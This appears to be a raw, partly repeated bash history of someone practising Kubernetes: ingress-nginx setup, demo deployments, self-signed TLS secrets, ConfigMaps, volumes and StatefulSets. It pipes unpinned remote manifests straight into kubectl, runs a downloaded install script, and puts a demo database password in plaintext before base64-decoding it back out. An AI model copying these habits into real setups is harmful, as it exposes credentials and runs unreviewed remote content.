vim /etc/hosts
curl http://localhost:80
curl 10.134.196.21:80
curl http://localhost:80
curl http://localhost:80/hostname.html
curl 10.134.196.21
curl 10.134.196.21/hostname.html
curl 127.0.0.1
curl 127.0.0.1:8080
curl 127.0.0.1
curl 127.0.0.1/hostname.html
curl 127.0.0.1:80/hostname.html
vim /var/www/html/test1.php 
vim /var/www/html/xss1.html 
vim /etc/httpd/conf.modules.d/
vim /etc/httpd/conf/httpd.conf.bak 
netstat -an |grep 8080
netstat -an |grep 80
ss -tnl |grep 80
netstat -tnlp
netstat -tnlp|grep 80
vim .deploy-demo.yaml.swp 
rm .deploy-demo.yaml.swp 
vim .deploy-demo.yaml
vim deploy-demo.yaml
unset https_proxy
unset http_proxy
curl 10.150.7.55:30080
ssh root@10.148.8.128
vim /etc/ssh/sshd_config 
ssh root@10.148.8.128
vim /etc/ssh/sshd_config 
ping 10.148.8.128
cd manifests/
ls
cd
cd ingress-nginx/
ls
vim service-nodeport.yaml 
kubectl apply -f .
kubectl get svc -n ingress-nginx
kubectl get po -n ingress-nginx
kubectl delete deploy nginx-ingress-controller-7f74f657bd-bsgq4 
ls
curl https://raw.githubusercontent.com/kubernetes/ingress-nginx/master/deploy/namespace.yaml     | kubectl apply -f -
curl https://raw.githubusercontent.com/kubernetes/ingress-nginx/master/deploy/namespace.yaml     | kubectl apply -f 
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/master/deploy/namespace.yaml
kubectl get pods --all-namespaces -l app=ingress-nginx --watch
kubectl get pods --all-namespaces -l app=nginx-ingress --watch
kubectl get pods --all-namespaces -l nginx-ingress-controller --watch
kubectl get pods --all-namespaces -l app=nginx-ingress-controller --watch
kubectl get pods --all-namespaces -l app=ingress-nginx --watch
ls
kubectl get svc -n ingress-nginx
kubectl delete svc default-http-backend -n ingress-nginx
kubectl delete deploy default-http-backend -n ingress-nginx
kubectl get svc -n ingress-nginx
kubectl get po -n ingress-nginx
cd
ls
mkdir backend
mv ingress-nginx/default-backend.yaml  backend/
ls ingress-nginx/
kubectl apply -f ./ingress-nginx/
kubectl apply -f manifests/ingress/
kubectl get svc -n ingress-nginx
kubectl get po -n ingress-nginx
kubectl ingress-nginx backends
yum -y install kubectl-plugin
wget https://kubernetes.github.io/ingress-nginx/kubectl-plugin
ls
ll kubectl-plugin 
vim kubectl-plugin 
kubectl krew install ingress-nginx
mkdir krew
cd krew/
vim krew-install.sh
sh krew-install.sh 
vim ~/.bashrc
source ~/.bashrc
kubectl krew
kubectl krew install ingress-nginx
kubectl ingress-nginx --help
kubectl ingress-nginx backends
kubectl ingress-nginx backends --all-ns
kubectl ingress-nginx backends --all-namespace
kubectl ingress-nginx backends --all-namespaces
kubectl ingress-nginx backends -n ingress-nginx
kubectl get svc -n ingress-ngixn
kubectl get svc -n ingress-nginx
kubectl get po -n ingress-nginx
cd
vim manifests/ingress/
kubectl ingress-nginx backends -n ingress-nginx
kubectl ingress-nginx backends
kubectl ingress-nginx backends --help
history |tomcat
docker images
 docker images |awk '/myweb/{print "docker rmi "$1}'|bash
 docker images |awk '/<myweb>/{print "docker rmi "$1}'|bash
docker images
 docker images |awk '/<myweb>/{print "docker rmi "$3}'|bash
docker images
docker images |awk '/myweb/'
docker images |awk '/myweb/{print "docker rmi "$3}'|bash
docker images |awk '/<myweb>/{print "docker rmi "$3}'|bash
kubectl get po -n ingress-nginx
vim ./manifests/ingress/ingress-myapp.yaml 
kubectl delete po nginx-ingress-controller-7f74f657bd-zbwbd
kubectl delete po nginx-ingress-controller-7f74f657bd-zbwbd -n ingress-nginx
cd manifests/ingress/
ls
kubectl delete deploy ingress-myapp.yaml 
kubectl get deploy 
kubectl delete deploy ingress-myapp 
kubectl delete deploy ingress-myapp  -n ingress-nginx
kubectl get deploy -n ingress-nginx
kubectl get po -n ingress-myapp.yaml 
kubectl get po -n ingress-nginx
kubectl get rc
kubectl get rc -n ingress-nginx
ls
vim ingress-myapp.yaml 
kubectl get ing
kubectl get svc
kubectl get svc -n ingress-nginx
vim kubectl get ingress
kubectl get ing
kubectl describe ing ingress-myapp
kubectl get svc
kubectl get svc -n ingress-nginx
cp deploy-demo.yaml tomcat-deploy.yaml
vim tomcat-deploy.yaml 
cp ingress-myapp.yaml ingress-tomcat.yaml
vim ingress-tomcat.yaml 
kubectl apply -f ingress-tomcat.yaml 
vim /etc/hosts
kubectl get svc
kubectl get ing
kubeclt apply -f ingress-tomcat.yaml 
kubectl apply -f ingress-tomcat.yaml 
kubectl get ing
cd
vim ingress-nginx/service-nodeport1.yaml 
cd ingress-nginx/
kubectl apply -f service-nodeport1.yaml 
ls
kubectl get svc
kubectl get secret
ls
cd ../manifests/ingress/
ls
vim ingress-tomcat.yaml 
cd 
cd backend/
vim default-backend.yaml 
cd
vim ingress-nginx/
cat ingress-nginx/mandatory.yaml 
kubectl get svc
kubectl get po
kubectl get ns
cd ingress-nginx/
ls
kubectl apply -f .
vim service-nodeport1.yaml 
vim mandatory.yaml 
vim service-nodeport1.yaml 
ls
kubectl apply -f mandatory.yaml 
kubectl apply -f service-nodeport1.yaml 
kubectl get svc
kubectl get svc -n ingress-nginx
kubectl get po
kubectl get po -n ingress-nginx
kubectl get ing
kubectl get po
kubectl describe ing
vim ../ingress/default-backend.yaml 
kubectl delete -f .
cd 
cd ingress
kubectl apply -f .
kubectl apply -f namespace.yaml 
kubectl apply -f .
cd testapps/
ls
kubectl get svc
kubectl get svc -n ingress-ngixn
kubectl get svc -n ingress-nginx
kubectl apply -f deploy-demo.yaml 
kubectl apply -f ingress-myapp.yaml 
mkdir tmp1
cp ./* tmp1/
cp ./* tmp1
cd tmp1/
ls
cd ..
ls
openssl genrsa -out tls1.key 2048
openssl req -new -x509 -key tls1.key -out -subj /C=CN/ST=Beijing/L=Beijing/O=DevOps/CN=myapp.zhang.com
openssl req -new -x509 -key tls1.key -out tls1.crt -subj /C=CN/ST=Beijing/L=Beijing/O=DevOps/CN=myapp.zhang.com
ls
kubectl create secret tls1 myapp-ingress-secret --cert=tls1.crt --key=tls1.key
kubectl create secret tls myapp-ingress-secret --cert=tls1.crt --key=tls1.key
kubectl get secret
cp ingress-myapp.yaml ingress-myapp-tls.yaml
vim ingress-myapp-tls.yaml 
kubectl apply -f ingress-myapp-tls.yaml 
kubectl get ing
history|tail 50
docker images
 docker images |awk '/myweb/{print "docker rmi "$1}'|bash
 docker images |awk '/<myweb>/{print "docker rmi "$1}'|bash
docker images
 docker images |awk '/<myweb>/{print "docker rmi "$3}'|bash
docker images
docker images |awk '/myweb/'
docker images |awk '/myweb/{print "docker rmi "$3}'|bash
docker images |awk '/<myweb>/{print "docker rmi "$3}'|bash
kubectl get po -n ingress-nginx
vim ./manifests/ingress/ingress-myapp.yaml 
kubectl delete po nginx-ingress-controller-7f74f657bd-zbwbd
kubectl delete po nginx-ingress-controller-7f74f657bd-zbwbd -n ingress-nginx
cd manifests/ingress/
ls
kubectl delete deploy ingress-myapp.yaml 
kubectl get deploy 
kubectl delete deploy ingress-myapp 
kubectl delete deploy ingress-myapp  -n ingress-nginx
kubectl get deploy -n ingress-nginx
kubectl get po -n ingress-myapp.yaml 
kubectl get po -n ingress-nginx
kubectl get rc
kubectl get rc -n ingress-nginx
ls
vim ingress-myapp.yaml 
kubectl get ing
kubectl get svc
kubectl get svc -n ingress-nginx
vim kubectl get ingress
kubectl get ing
kubectl describe ing ingress-myapp
kubectl get svc
kubectl get svc -n ingress-nginx
cp deploy-demo.yaml tomcat-deploy.yaml
vim tomcat-deploy.yaml 
cp ingress-myapp.yaml ingress-tomcat.yaml
vim ingress-tomcat.yaml 
kubectl apply -f ingress-tomcat.yaml 
vim /etc/hosts
kubectl get svc
kubectl get ing
kubeclt apply -f ingress-tomcat.yaml 
kubectl apply -f ingress-tomcat.yaml 
kubectl get ing
cd
vim ingress-nginx/service-nodeport1.yaml 
cd ingress-nginx/
kubectl apply -f service-nodeport1.yaml 
ls
kubectl get svc
kubectl get secret
ls
cd ../manifests/ingress/
ls
vim ingress-tomcat.yaml 
cd 
cd backend/
vim default-backend.yaml 
cd
vim ingress-nginx/
cat ingress-nginx/mandatory.yaml 
kubectl get svc
kubectl get po
kubectl get ns
cd ingress-nginx/
ls
kubectl apply -f .
vim service-nodeport1.yaml 
vim mandatory.yaml 
vim service-nodeport1.yaml 
ls
kubectl apply -f mandatory.yaml 
kubectl apply -f service-nodeport1.yaml 
kubectl get svc
kubectl get svc -n ingress-nginx
kubectl get po
kubectl get po -n ingress-nginx
kubectl get ing
kubectl get po
kubectl describe ing
vim ../ingress/default-backend.yaml 
kubectl delete -f .
cd 
cd ingress
kubectl apply -f .
kubectl apply -f namespace.yaml 
kubectl apply -f .
cd testapps/
ls
kubectl get svc
kubectl get svc -n ingress-ngixn
kubectl get svc -n ingress-nginx
kubectl apply -f deploy-demo.yaml 
kubectl apply -f ingress-myapp.yaml 
mkdir tmp1
cp ./* tmp1/
cp ./* tmp1
cd tmp1/
ls
cd ..
ls
openssl genrsa -out tls1.key 2048
openssl req -new -x509 -key tls1.key -out -subj /C=CN/ST=Beijing/L=Beijing/O=DevOps/CN=myapp.zhang.com
openssl req -new -x509 -key tls1.key -out tls1.crt -subj /C=CN/ST=Beijing/L=Beijing/O=DevOps/CN=myapp.zhang.com
ls
kubectl create secret tls1 myapp-ingress-secret --cert=tls1.crt --key=tls1.key
kubectl create secret tls myapp-ingress-secret --cert=tls1.crt --key=tls1.key
kubectl get secret
cp ingress-myapp.yaml ingress-myapp-tls.yaml
vim ingress-myapp-tls.yaml 
kubectl apply -f ingress-myapp-tls.yaml 
kubectl get ing
history|tail 50
history|tail -50
openssl req -new -x509 -key tls1.key -out tls1.crt -subj /C=CN/ST=Beijing/L=Beijing/O=DevOps/CN=myapp.zhangbiao.com
ls
kubectl create secret tls myapp-ingress-secret --cert=tls1.crt --key=tls1.key
kubectl delete secret tls myapp-ingress-secret
kubectl create secret tls myapp-ingress-secret --cert=tls1.crt --key=tls1.key
kubectl get secret
kubectl apply -f ingress-myapp-tls.yaml 
kubectl get ing
kubectl krew
kubectl krew install ingress-nginx
kubectl ingress-nginx --help
kubectl ingress-nginx backends
kubectl ingress-nginx backends --all-ns
kubectl ingress-nginx backends --all-namespace
kubectl ingress-nginx backends --all-namespaces
kubectl ingress-nginx backends -n ingress-nginx
kubectl get svc -n ingress-ngixn
kubectl get svc -n ingress-nginx
kubectl get po -n ingress-nginx
cd
vim manifests/ingress/
kubectl ingress-nginx backends -n ingress-nginx
kubectl ingress-nginx backends
kubectl ingress-nginx backends --help
history |tomcat
docker images
kubectl get pods --all-namespaces -l app=ingress-nginx --watch
vim ingress-version.sh
sh ingress-version.sh 
history |tail -50
kubectl ingress-nginx backends -n ingress-nginx
kubectl get svc
vim ingress-nginx/mandatory.yaml 
cd manifests/ingress/
ls
vim ingress-myapp.yaml 
kubectl apply -f ingress-myapp.yaml 
kubectl get po -n ingress-nginx
kubectl get ing -n ingress-nginx
kubectl get svc -n ingress-nginx
kubectl get ing
kubectl delete ing ingress-myapp 
kubectl apply -f ingress-myapp.yaml 
kubectl exec -n ingress-nginx -it nginx-ingress-controller-7f74f657bd-bsgq4  -- /bin/sh
vim ingress-myapp.yaml 
kubectl delete ing ingress-myapp
kubectl delete ing ingress-myapp -n ingress-nginx
kubectl apply -f ingress-myapp.yaml 
ls
kubectl apply -f tomcat-deploy.yaml 
kubectl get po
kubectl exec -it tomcat-deploy-5cc5c945bf-m94lr -- netstat -tnl
kubectl get po
vim tomcat-deploy.yaml 
ls
kubectl get po
kubectl exec -it tomcat-deploy-5cc5c945bf-m94lr -- netstat -tnl
kubectl get svc
kubectl apply -f ingress-tomcat.yaml 
kubectl get ing
vim ingress-tomcat.yaml 
kubectl get ing
kubectl apply -f ingress-myapp.yaml 
kubectl get ing
kubectl describe ingress
vim ingress-myapp.yaml 
vim tomcat-deploy.yaml 
vim ingress-tomcat.yaml 
cd
cd ingress
ls
cat configmap.yaml 
cat tcp-services-configmap.yaml 
cat udp-services-configmap.yaml 
cat rbac.yaml 
ls
cd testapps/
vim ingress-tomcat-tls.yaml 
cd 
cd backend/
ls
vim default-backend.yaml 
kubectl apply -f default-backend.yaml 
vim service-nodeport.yaml 
vim default-backend.yaml 
kubectl get svc
kubectl get ing
kubectl get po -n ingress-nginx
kubectl get po -n ingress-nginx -o wide
kubectl get svc
kubectl get svc -n ingress-nginx
vim default-backend.yaml 
kubectl delete default-backend.yaml 
kubectl delete -f default-backend.yaml 
kubectl get po -n ingress-nginx
kubectl get svc
kubectl get svc -n ingress-nginx
kubectl get po -n ingress-nginx
kubectl get ing -n ingress-nginx
kubectl get ing
kubectl get po
kubectl get svc
kubectl explain service.metadata.labels
kubectl explain service
kubectl explain service.spec
netstat -an |grep 300
kubectl get po -n ingress-nginx
vim ingress-nginx/mandatory.yaml 
kubectl get po -n ingress-nginx -o wide
kubectl get po -n ingress-nginx -l
kubectl get po -n ingress-nginx --show-labels
kubectl ingress-nginx backends
kubectl ingress-nginx backends -n ingress-nginx
vim /etc/hosts
unset http_proxy
unset https_proxy
curl 10.150.7.55:30080
vim /etc/httpd/conf/httpd.conf
curl 10.134.196.21:30080
history |grep docker
vim backend/default-backend.yaml 
kubectl apply -f  backend/default-backend.yaml 
kubectl get svc -n ingress-nginx
kubectl get po -n ingress-nginx
ls
docker images
curl tomcat.mageedu.com
curl tomcat.mageedu.com:30080
kubectl get svc
netstat -an |grep 30080
kubectl describe ingress
kubectl delete ing ingress-myapp
kubectl describe ingress
kubectl get ing -n ingress-nginx
kubectl get ing 
kubectl describe ingress
kubectl get svc
kubectl get svc -n ingress-nginx
systemctl stop httpd
kubectl get po -n ingress-nginx -o wide
kubectl get ing
kubectl describe ing
vim manifests/ingress/ingress-tomcat.yaml 
kubectl get svc
kubectl get ing
cd manifests/ingress/
kubectl delete -f ingress-tomcat.yaml 
kubectl apply -f ingress-tomcat.yaml 
kubectl get ing
kubectl describe ing
kubectl delete -f ingress-tomcat.yaml 
kubectl delete -f tomcat-deploy.yaml 
vim tomcat-deploy.yaml 
kubectl explain service.spec.selector
kubectl explain service.spec.selector.matchlabels
ls
vim deploy-demo.yaml 
kubectl apply -f ingress-myapp.yaml 
vim ingress-myapp.yaml 
kubectl get svc
kubectl get svc -n ingress-nginx
vim ingress-myapp.yaml 
kubectl get po
kubectl apply -f deploy-demo.yaml 
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get svc
kubectl get svc -n ingress-nginx
kubectl get po -n ingress-nginx
vim ingress-myapp.yaml 
kubectl get ing
kubectl describeing
kubectl describe ing
kubectl delete -f .
ls
kubectl get po -n ingress-nginx
kubectl get po 
kubectl get po -n ingress-nginx -o wide
kubectl describe pods nginx-ingress-controller-7f74f657bd-zbwbd
kubectl describe  nginx-ingress-controller-7f74f657bd-zbwbd
history |grep descri
kubectl describe pods nginx-ingress-controller-7f74f657bd-zbwbd -n ingress-nginx
kubectl describe pods default-http-backend-85c95d5db-2fbjm  -n ingress-nginx
 kubectl get svc
 kubectl get svc -n ingress-nginx
cd
cd manifests/
cd ingress/
ls
vim ingress-myapp.yaml 
docker pull tomcat:8.5.32-jre8-alpine
kubectl exec -it nginx-ingress-controller-7f74f657bd-zbwbd  -- /bin/sh
history |grep exec
kubectl exec -n ingress-it nginx-ingress-controller-7f74f657bd-zbwbd  -- /bin/sh
kubectl exec -n ingress -it nginx-ingress-controller-7f74f657bd-zbwbd  -- /bin/sh
kubectl exec -n ingress-nginx -it nginx-ingress-controller-7f74f657bd-zbwbd  -- /bin/sh
clear
kubectl exec -n ingress-nginx -it nginx-ingress-controller-7f74f657bd-bsgq4  -- /bin/sh

clear
ls
cd
vim ingress-nginx/service-nodeport.yaml 
kubectl get svc -n ingress-nginx
kubectl exec -n ingress-nginx -it nginx-ingress-controller-7f74f657bd-bsgq4  -- /bin/sh
:q
curl https://raw.githubusercontent.com/kubernetes/ingress-nginx/master/deploy/provider/baremetal/service-nodeport.yaml     | kubectl apply -f -
vim ingress-nginx/
kubectl apply -f ingress-nginx/
kubectl get svc
kubectl get svc -n ingress-nginx
kubectl get po -n ingress-nginx
kubectl get po -n ingress-nginx --show-labels
vim  manifests/ingress/ingress-myapp.yaml 
kubectl get po -n ingress-nginx --show-labels
kubectl get po -n ingress-nginx -l app=ingress-nginx
curl https://raw.githubusercontent.com/kubernetes/ingress-nginx/master/deploy/namespace.yaml
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/mandatory.yaml
kubectl api-versions
kubectl
kubectl --version
kubeadm --version
kubeadm version
docker version
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml
ls
cd ingress-nginx/
ls
vim service-nodeport.yaml 
wget  https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml
mv service-nodeport.yaml.1  service-nodeport1.yaml
vim service-nodeport1.yaml 
vim service-nodeport.yaml 
kubectl get po -n ingress-nginx --showlabels
kubectl get po -n ingress-nginx --show-labels
kubectl get svc -n ingress-nginx --show-labels
vim service-nodeport1.yaml 
kubectl get pods --all-namespaces -l app.kubernetes.io/name=ingress-nginx --watch
nginx-ingress-controller version
kubectl get po
kubectl get svc
kubectl get svc -n ingress-nginx
vim service-nodeport1.yaml 
kubectl apply -f service-nodeport1.yaml 
kubectl exec -n ingress-nginx -it nginx-ingress-controller-7f74f657bd-bsgq4  -- /bin/sh
cd
ls
cd backend/
kubectl delete -f default-backend.yaml
cd
kubectl get po
kubectl get po -n ingress-nginx
cd ingress-nginx/
ls
kubectl delete -f .
mv service-nodeport.yaml ../backend/
cd
mkdir ingress
cd ingress
for file in namespace.yaml configmap.yaml rbac.yaml tcp-services-configmap.yaml with-rbac.yaml udp-services-configmap.yaml default-backend.yaml; do wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.17.1/deploy/$file; done
kubectl apply -f .
kubectl get ns
kubectl apply -f namespace.yaml 
kubectl get ns
kubectl apply -f .
vim default-backend.yaml 
vim with-rbac.yaml 
kubectl apply -f .
get po
kubectl get po -n ingress-nginx
kubectl get svc
vim service-nodeport.yaml
kubectl apply -f service-nodeport.yaml 
mkdir testapps
cd testapps/
vim deploy-demo.yaml
vim ingress-myapp.yaml
cd
cd ingress
ls
kubectl apply -f .
cd testapps/
kubectl apply -f .
kubectl get ingress
kubectl describe ing ingress-myapp
vim tomcat-deploy.yaml
vim ingress-tomcat.yaml
kubectl apply -f .
openssl genrsa -out tls.key 2048
openssl req -new -x509 -key tls.key -out tls.crt -subj /C=CN/ST=Beijing/L=Beijing/O=DevOps/CN=tomcat.wohaoshuai.com
ls
kubectl create secret tls tomcat-ingress-secret --cert=tls.crt --key=tls.key
kubectl explain ingress.spec.tls
vim ingress-tomcat-tls.yaml
kubectl apply -f ingress-tomcat-tls.yaml 
kubectl get ing
kubectl get secret
kubectl get ing
ls
kubectl apply -f tomcat-deploy.yaml ingress-tomcat.yaml 
kubectl apply -f tomcat-deploy.yaml 
kubectl apply -f ingress-tomcat.yaml 
vim ingress-tomcat-tls.yaml 
kubectl apply -f ingress-tomcat-tls.yaml 
kubectl get ing
vim tomcat-deploy.yaml 
vim ingress-tomcat
vim ingress-tomcat.yaml 
kubectl get po
kubectl get ing
ls
kubectl get secret
vim tomcat-deploy.yaml 
vim ingress-tomcat.yaml 
kubectl delete -f tomcat-deploy.yaml 
kubectl delete -f ingress-tomcat.yaml 
kubectl delete -f ingress-tomcat-tls.yaml 
kubectl get svc
kubectl get ing
kubectl apply -f tomcat-deploy.yaml 
kubectl apply -f ingress-tomcat.yaml 
kubectl apply -f ingress-tomcat-tls.yaml 
kubectl get po 
kubectl get svc
kubectl get secret
history |tail -100
cd ..
vim default-backend.yaml 
cat namespace.yaml 
cat default-backend.yaml 
kubectl exec -n ingress-nginx -it nginx-ingress-controller-7f74f657bd-bsgq4  -- /bin/sh
kubectl get po -n ingress-nginx
kubectl exec -n ingress-nginx -it nginx-ingress-controller-7f74f657bd-rb5vv  -- /bin/sh
kubectl exec -n ingress-nginx -it nginx-ingress-controller-7c457c5b84-rd5vv -- /bin/sh
kubectl get po
cd testapps/
vim tomcat-deploy.yaml 
kubectl get po
ls
kubectl delete -f ./*.yaml
kubectl delete -f *.yaml
kubectl delete -f .
cd ..
ls
kubectl delete -f .
vim default-backend.yaml 
kubectl get po -n ingress-nginx
kubectl exec -n ingress-nginx -it nginx-ingress-controller-7f74f657bd-jmsxn -- /bin/sh
unset https_proxy
unset http_proxy
curl 10.244.1.102
curl 10.244.1.103
mount
kubectl explain pv.spec
#kubectl explain pods.spec.containers.env
kubectl explain pods.spec.containers.env
kubectl explain pods.spec.containers.env.valueForm
kubectl explain pods.spec.containers.env.valueFrom
kubectl explain configmap
kubectl create configmap --help
history |grep docker |tail -100
kubectl create configmap nginx-config --from-literal=nginx_port=80 --from-literal=server_name=myapp.magedu.com
kubectl get cm
kubectl describe cm
ls
cd manifests/
mkdir configmap
cd configmap/
ls
nvim www.com
vim www.com
mv www.com www.conf
kubectl create configmap nginx-www --from-file=./www.conf
kubectl get cm
kubectl get cm nginx-www -o yaml
kubectl describe cm nginx-www
cd
cd manifests/
ls
cd configmap/
cp ../pod-demo.yaml  ./
mv pod-demo.yaml  pod-configmap.yaml
vim pod-configmap.yaml 
kubectl apply -f pod-configmap.yaml 
kubectl get po
kubectl exec -it  pod-cm-1 -- /bin/sh
ls
cp pod-configmap.yaml pod-configmap-2.yaml 
vim pod-configmap-2.yaml 
kubectl apply -f pod-configmap-2.yaml 
vim pod-configmap-2.yaml 
kubectl apply -f pod-configmap-2.yaml 
kubectl get po
vim pod-configmap-2.yaml 
kubectl apply -f pod-configmap-2.yaml 
kubectl get po
vim pod-configmap-2.yaml 
kubectl apply -f pod-configmap-2.yaml 
kubectl delete pod pod-cm-2
kubectl apply -f pod-configmap-2.yaml 
kubectl get po 
kubectl exec -it pod-cm-2 -- /bin/sh
cd manifests/volumes/
ls
vim pod-demo.yaml 
kubectl apply -f pod-demo.yaml 
kubectl get po
vim pod-demo.yaml 
kubectl apply -f pod-demo.yaml 
kubectl pod-demo.yamlget po
kubectl get po
kubectl delete -f .
vim pod-demo.yaml 
kubectl apply -f pod-demo.yaml 
kubectl get po
kubectl delete -f .
vim pod-demo.yaml 
kubectl apply -f pod-demo.yaml 
kubectl delete -f .
vim pod-demo.yaml 
kubectl apply -f pod-demo.yaml 
kubectl get po
kubectl describe po  pod-demo
kubectl get po
kubectl delete -f .
vim pod-demo.yaml 
kubectl apply -f pod-demo.yaml 
vim pod-demo.yaml 
kubectl apply -f pod-demo.yaml 
kubectl explain pod.spec.containers.args
vim pod-demo.yaml 
kubectl apply -f pod-demo.yaml 
kubectl get po
kubectl describe po pod-demo
kubectl get po
kubectl delete -f pod-demo.yaml 
mv pod-demo.yaml pod-demo-vol.yaml 
ls
kubectl get po
kubectl exec -it myapp-deploy-798dc9b584-94525  -- /bin/sh
kubectl explain pods.spec.containers.volumeMount
kubectl explain pods.spec.containers.volumeMounts
ls /data/www/html/
kubectl exec -it pod-demo -c myapp -- /bin/sh
docker images
kubectl explain pods.spec
kubectl explain pods.spec.volumes
kubectl explain pods.spec.volumes.rbd
kubectl explain pods.spec.volumes.emptyDir
kubectl explain pods.spec.volumes.containers
kubectl explain pods.spec.containers
kubectl explain pods.spec.containersvolumeMounts
kubectl explain pods.spec.containers.volumeMounts
cd manifests/
mkdir volumes
cd volumes/
cp ../pod-demo.yaml  .
ls]
ls
vim pod-demo.yaml 
kubectl apply -f pod-demo.yaml 
kubectl get pods
kubectl describe pod-demo
kubectl describe po  pod-demo

kubectl delete -f pod-demo.yaml
vim pod-demo.yaml 
kubectl apply -f pod-demo.yaml 
kubectl get  pods
kubectl exec -it pod-demo -c busybox -- /bin/sh
kubectl delete -f pod-demo.yaml
docker images
kubectl get po
kubectl delete -f pod-demo.yaml
kubectl get po
vim pod-demo.yaml 
kubectl delete -f pod-demo.yaml
kubectl apply -f pod-demo.yaml 
kubectl get po
kubectl get po -o wide
kubectl explain pods.spec.containers.volumeMounts
kubectl explain pods.spec.containers.volumeMounts.hostPath
kubectl explain pods.spec.containers.volumeMounts.hostpath
kubectl explain pods.spec.volume.hostPath
kubectl explain pods.spec.volumes.hostPath
kubectl explain pods.spec.volumes.hostPath.type
ls
vim pod-hostpath-vol.yaml
clear
cd
mkdir /data/pod/volume1 -p
vim /data/pod/volume1/index.html
rm -f /data/pod/volume1/
rm -rf /data/pod/volume1/
ls /data
ls /data/pod/
rm -rf /data/pod/
cd manifests/volumes/
kubectl apply -f pod-hostpath-vol.yaml 
kubectl get po -o wide
rpm -qa |grep nfs
vim /etc/nfs.conf 
vim /etc/exports
kubectl explian configmap.spec.containers.env.valueFrom.configMapKeyRef
kubectl explain configmap.spec.containers.env.valueFrom.configMapKeyRef
kubectl explain pods.spec.containers.env.valueFrom.configMapKeyRef
kubectl edit cm pod-cm-1
kubectl edit cm nginx-config
kubectl describe cm 
kubectl get cm
kubectl delete pod pod-cm-1
kubectl get po
kubectl edit cm nginx-config
kubectl create secret generic  mysql-roo-password --from-literal=password=MyP@ss123
kubectl get secret
kubectl descrebe secret
kubectl describe secret
kubectl describe configmap nginx-www
kubectl get secret mysql-root-password -o yaml
kubectl get secret mysql-roo-password -o yaml
echo TXlQQHNzMTIz
echo TXlQQHNzMTIz |base
echo TXlQQHNzMTIz |base64
echo TXlQQHNzMTIz |base64 -d
ls
history |tail 200
kubectl create secret generic  mysql-roo-password --from-literal=password=MyP@ss123
kubectl get secret
kubectl descrebe secret
kubectl describe secret
kubectl describe configmap nginx-www
kubectl get secret mysql-root-password -o yaml
kubectl get secret mysql-roo-password -o yaml
echo TXlQQHNzMTIz
echo TXlQQHNzMTIz |base
echo TXlQQHNzMTIz |base64
echo TXlQQHNzMTIz |base64 -d
ls
history |tail 200
history |tail -200
kubectl get svc
cd manifests/
ls
vim readiness-httpget.yaml 
ls
kubectl get pv
vim steteful-demo.yaml 
kubectl apply -f steteful-demo.yaml 
kubectl delete svc myapp
kubectl get svc
kubectl apply -f steteful-demo.yaml 
kubectl get sts
kubectl get svc
kubectl get sts
kubectl get pvc
kubectl get sts
vim steteful-demo.yaml 
kubectl apply -f steteful-demo.yaml 
kubectl get pvc
kubectl get pv
kubectl get svc
kubectl get sts
kubectl get po
kubectl describe po myapp-0
kubectl delete -f steteful-demo.yaml 
kubectl apply -f steteful-demo.yaml 
kubectl delete -f steteful-demo.yaml 
kubectl apply -f steteful-demo.yaml 
kubectl delete -f steteful-demo.yaml 
kubectl apply -f steteful-demo.yaml 
kubectl explain pods.spec
kubectl create secret 
kubectl explain pods.spec.generic
kubectl get svc
kubectl describe po myapp-2
enc
env
unset http_proxy
unset https_proxy
docker pull ikubernetes/myapp:v5
docker iamges
docker images
docker save -o myimage.gz ikubernetes/myapp:v5
ls
scp myimage.gz docker02:~
kubectl explain sts
kubectl explain sts.spec
kubectl get po -w
ls
kubectl ge po
kubectl get po
kubectl create secret --help\
kubectl create secret --help
kubectl create secret --help  
kubectl get sec
kubectl get se
kubectl get sc
kubectl get st
kubectl get scr
kubectl get scrt
kubectl get secr
kubectl get secret
kubectl get secret tomcat-ingress-secret -o yaml
echo  LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURsekNDQW4rZ0F3SUJBZ0lKQVBUQzNlLzJyRUlETUEwR0NTcUdTSWIzRFFFQkN3VUFNR0l4Q3pBSkJnTlYKQkFZVEFrTk9NUkF3RGdZRFZRUUlEQWRDWldscWFXNW5NUkF3RGdZRFZRUUhEQWRDWldscWFXNW5NUTh3RFFZRApWUVFLREFaRVpYWlBjSE14SGpBY0JnTlZCQU1NRlhSdmJXTmhkQzUzYjJoaGIzTm9kV0ZwTG1OdmJUQWVGdzB5Ck1EQXpNamd3TURReU16bGFGdzB5TURBME1qY3dNRFF5TXpsYU1HSXhDekFKQmdOVkJBWVRBa05PTVJBd0RnWUQKVlFRSURBZENaV2xxYVc1bk1SQXdEZ1lEVlFRSERBZENaV2xxYVc1bk1ROHdEUVlEVlFRS0RBWkVaWFpQY0hNeApIakFjQmdOVkJBTU1GWFJ2YldOaGRDNTNiMmhoYjNOb2RXRnBMbU52YlRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCCkJRQURnZ0VQQURDQ0FRb0NnZ0VCQU5sbFlpUys2c21razlWNjRZTnlkUUZUNTJiTE5LWngxazROMmQwM1J4L00KZ1lIazRIa1dsU1dNQ2dFYUF6ODlBUlJSbnpxamlIVld0UjdCbm9vRUExSVRab1dIZmxHNy8vcjF0TjBPZmpuQwpRQ2c2dkovSW4vdjFjRTVsRFd2TTBtU3J3YWREcE9EUWJDY2dYN092Z1dvUjJOYzBKK3IwY2RzRnh2Vi80N3o4ClNRY1NERU1UYzdkbHYzYlc1V1VRdkFlYmtreFNycmtZeWFRaVZsa0JST1RQaFVrelpRRFRUSnlsdlI2QjgzaWQKV0tVTWI4azdrVVNaMlVWelRVVWhDQy83Q1U5M3d1MkIrNEgvajJvc0pWYkZVeWkrc2hCMTlETnhZUThVcXdJVQorNHRnSUdOV3N2VXJwNzZ6dkRyYnlQWXVWVnZ2R2RkOEZiVzZQRE95TjZVQ0F3RUFBYU5RTUU0d0hRWURWUjBPCkJCWUVGRTlwOTVnelZlbWNTK3NORnFmYzdtY1lzeVpiTUI4R0ExVWRJd1FZTUJhQUZFOXA5NWd6VmVtY1M